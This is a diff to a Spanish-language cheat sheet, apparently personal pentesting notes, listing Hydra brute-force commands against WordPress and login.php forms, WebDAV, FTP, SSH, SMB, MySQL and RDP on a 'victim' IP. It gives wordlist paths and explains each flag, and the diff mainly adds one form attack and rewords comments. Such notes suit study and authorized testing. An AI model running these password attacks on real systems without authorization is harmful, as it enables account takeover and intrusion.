@@ -34,9 +34,11 @@ Esto se usa en el panel del admin de WordPress.
 ```python
 ❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' 
 ❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid user'
-# Haremos un ataque de fuerza bruta a WordPress
+❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
 
-	# l (ele) = Usuario que en este caso es  'omar'
+# Haremos un ataque de fuerza bruta a WordPress (Todo lo anterior lo obtenemos de la misma página web en 'form action=/login.php') y colocamos todas la etiquetas 
+
+	# l (ele) = Usuario de login
 	# P = Ruta del diccionario
 	# log y pwd = Lo podemos encontrar en el apartado de la pagina web 'Ctrl + u' 
 	# S = Redireccionamiento con el codigo 302
@@ -49,7 +51,7 @@ Esto se usa en el panel del admin de WordPress.
 ❯ hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt ❮IP❯ http-get /webdav/
 
 	# webdav = Directorio de autenticacion 
-	# L = Indicas un archivo que disponga de usuarios 
+	# L = Indicas un archivo que disponga de usuarios para login
 	# P = Ruta del diccionario o 'archivo que contiene passwds'
 ```
 
@@ -59,7 +61,7 @@ Esto se usa en el panel del admin de WordPress.
 
 ❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ❮IP❯ ftp -t 4
 
-	# l (ele) = Usuario que en este caso es  'omar'
+	# l (ele) = Usuario de login
 	# L = Indicas un archivo que disponga de usuarios 
 	# P = Ruta del diccionario o 'archivo que contiene passwds'
 	# t = Lanzar tareas en paralelo al mismo tiempo
@@ -74,7 +76,7 @@ Esto se usa en el panel del admin de WordPress.
 	# ssh = Puerto al que vamos a atacar 22
 	# IP = Direccion de la maquina victima
 	# P = Ruta del diccionario o 'archivo que contiene passwds'
-	# L = Ruta del diccionario o 'archivo que contiene users'
+	# L = Ruta del diccionario o 'archivo que contiene users' para login
 	# t = Lanzar tareas en paralelo al mismo tiempo
 ```
 
@@ -85,7 +87,7 @@ Esto se usa en el panel del admin de WordPress.
 	# ssh = Puerto al que vamos a atacar 22
 	# IP = Direccion de la maquina victima
 	# P = Ruta del diccionario o 'archivo que contiene passwds'
-	# l (ele) = usuario que en este caso es  'root'
+	# l (ele) = Usuario login que en este caso es  'root'
 	# t = Lanzar tareas en paralelo al mismo tiempo
 	# V = Verbosity
 	# s = Port y es el puerto al que nos queremos conectar 
@@ -98,9 +100,9 @@ Esto se usa en el panel del admin de WordPress.
 
 ❯ hydra -L user.list -P password.list smb://<IP>        # Para ver si esos usuarios y passwd son validos en un servidor SMB
 
-	# L = Ruta o archivo que contiene los usuarios
+	# L = Ruta o archivo que contiene los usuarios para login
 	# P = Ruta o archivo que contiene las passwd
-	# l = Un usuario en especifico
+	# l = Un usuario en especifico para login 
 ```
 
 ## Hydra fuerza bruta MYSQL
@@ -109,7 +111,7 @@ Esto se usa en el panel del admin de WordPress.
 ❯ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> mysql
 
 	# P = Ruta o archivo que contiene las passwd
-	# l = Un usuario en especifico
+	# l = Un usuario en especifico para login 
 ```
 
 ## Hydra fuerza bruta RDP
@@ -118,7 +120,7 @@ Esto se usa en el panel del admin de WordPress.
 # Brute force para encontrar usuarios y sus passwd en RDP
 ❯ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<IP> -s 3333           
 
-	# L = Ruta o archivo que contiene los usuarios
+	# L = Ruta o archivo que contiene los usuarios para login 
 	# P = Ruta o archivo que contiene las passwd
 	# s = Especificas el puerto, si no lo haces Hydra asumira que es el puerto 3389
 ```
